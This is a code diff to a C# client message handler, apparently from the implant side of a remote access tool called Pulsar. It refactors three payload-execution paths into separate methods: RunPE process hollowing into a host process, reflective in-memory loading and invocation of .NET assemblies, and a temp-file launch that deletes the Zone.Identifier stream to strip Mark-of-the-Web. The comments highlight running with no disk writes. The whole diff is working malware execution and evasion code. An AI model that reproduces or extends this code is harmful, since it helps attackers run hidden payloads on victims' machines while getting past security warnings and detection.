@@ -187,85 +187,113 @@ namespace Pulsar.Client.Messages
                 {
                     if (useRunPE)
                     {
-                        Debug.WriteLine("Executing via RunPE...");
-                        // Execute using RunPE
-                        new Thread(() =>
-                        {
-                            try
-                            {
-                                // Detect payload architecture
-                                bool isPayload64Bit = IsPayload64Bit(fileBytes);
-                                Debug.WriteLine($"Detected payload architecture: {(isPayload64Bit ? "x64" : "x86")}");
-                                
-                                // Adjust host path based on payload architecture
-                                string hostPath = GetRunPEHostPath(runPETarget, runPECustomPath, isPayload64Bit);
-
-                                Debug.WriteLine($"RunPE: hostPath={hostPath}, payload size={fileBytes.Length}");
-
-                                if (string.IsNullOrEmpty(hostPath))
-                                {
-                                    Debug.WriteLine("RunPE: hostPath is null or empty!");
-                                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
-                                    return;
-                                }
-
-                                bool result = Helper.RunPE.Execute(hostPath, fileBytes);
-                                Debug.WriteLine($"RunPE execution result: {result}");
-                                _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = result });
-                            }
-                            catch (Exception ex)
-                            {
-                                Debug.WriteLine("RunPE execution failed: " + ex.Message);
-                                _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
-                            }
-                        }).Start();
+                        ExecuteViaRunPE(fileBytes, runPETarget, runPECustomPath);
+                        return;
                     }
-                    else if (executeInMemory)
+
+                    if (executeInMemory)
                     {
-                        Debug.WriteLine("Executing via .NET Memory Execution...");
-                        // Load the assembly into memory and execute it in a separate thread
-                        new Thread(() =>
-                        {
-                            try
-                            {
-                                Assembly asm = Assembly.Load(fileBytes);
-                                MethodInfo entryPoint = asm.EntryPoint;
-                                if (entryPoint != null)
-                                {
-                                    object[] parameters = entryPoint.GetParameters().Length == 0 ? null : new object[] { new string[0] };
-                                    entryPoint.Invoke(null, parameters);
-                                }
-                                _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
-                            }
-                            catch (Exception ex)
-                            {
-                                Debug.WriteLine(ex.Message);
-                                _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
-                            }
-                        }).Start();
+                        ExecuteViaInMemoryDotNet(fileBytes);
+                        return;
                     }
-                    else
-                    {
-                        Debug.WriteLine("Executing via normal process start...");
-                        // For normal execution, we have to write to temp file (Windows requirement)
-                        string tempPath = FileHelper.GetTempFilePath(fileExtension ?? ".exe");
-                        File.WriteAllBytes(tempPath, fileBytes);
-                        FileHelper.DeleteZoneIdentifier(tempPath);
-                        
-                        ProcessStartInfo startInfo = new ProcessStartInfo
-                        {
-                            UseShellExecute = true,
-                            FileName = tempPath
-                        };
-                        Process.Start(startInfo);
-                        _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
-                    }
+
+                    ExecuteViaTemporaryFile(fileBytes, fileExtension);
                 }
                 catch (Exception ex)
                 {
                     Debug.WriteLine($"ExecuteProcess exception: {ex.Message}");
                     _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                 }
+            }
+        }
+
+        /// <summary>
+        /// Executes a payload using the RunPE technique (in-memory, no disk writes).
+        /// </summary>
+        private void ExecuteViaRunPE(byte[] fileBytes, string runPETarget, string runPECustomPath)
+        {
+            Debug.WriteLine("Executing via RunPE (in-memory, no disk writes)...");
+            new Thread(() =>
+            {
+                try
+                {
+                    bool isPayload64Bit = IsPayload64Bit(fileBytes);
+                    Debug.WriteLine($"Detected payload architecture: {(isPayload64Bit ? "x64" : "x86")}");
+                    
+                    string hostPath = GetRunPEHostPath(runPETarget, runPECustomPath, isPayload64Bit);
+
+                    Debug.WriteLine($"RunPE: hostPath={hostPath}, payload size={fileBytes.Length}");
+
+                    if (string.IsNullOrEmpty(hostPath))
+                    {
+                        Debug.WriteLine("RunPE: hostPath is null or empty!");
+                        _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
+                        return;
+                    }
+
+                    bool result = Helper.RunPE.Execute(hostPath, fileBytes);
+                    Debug.WriteLine($"RunPE execution result: {result}");
+                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = result });
+                }
+                catch (Exception ex)
+                {
+                    Debug.WriteLine("RunPE execution failed: " + ex.Message);
+                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
+                }
+            }).Start();
+        }
+
+        /// <summary>
+        /// Executes a .NET assembly in-memory using reflection (no disk writes).
+        /// </summary>
+        private void ExecuteViaInMemoryDotNet(byte[] fileBytes)
+        {
+            Debug.WriteLine("Executing via .NET Memory Execution (in-memory, no disk writes)...");
+            new Thread(() =>
+            {
+                try
+                {
+                    Assembly asm = Assembly.Load(fileBytes);
+                    MethodInfo entryPoint = asm.EntryPoint;
+                    if (entryPoint != null)
+                    {
+                        object[] parameters = entryPoint.GetParameters().Length == 0 ? null : new object[] { new string[0] };
+                        entryPoint.Invoke(null, parameters);
+                    }
+                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
+                }
+                catch (Exception ex)
+                {
+                    Debug.WriteLine($".NET Memory Execution failed: {ex.Message}");
+                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
+                }
+            }).Start();
+        }
+
+        /// <summary>
+        /// Executes a file via temporary file (disk write required for normal process execution).
+        /// </summary>
+        private void ExecuteViaTemporaryFile(byte[] fileBytes, string fileExtension)
+        {
+            Debug.WriteLine("Executing via temporary file (disk write required for normal process execution)...");
+            try
+            {
+                string tempPath = FileHelper.GetTempFilePath(fileExtension ?? ".exe");
+                File.WriteAllBytes(tempPath, fileBytes);
+                FileHelper.DeleteZoneIdentifier(tempPath);
+                
+                ProcessStartInfo startInfo = new ProcessStartInfo
+                {
+                    UseShellExecute = true,
+                    FileName = tempPath
+                };
+                Process.Start(startInfo);
+                _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Temporary file execution failed: {ex.Message}");
+                _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
             }
         }
 
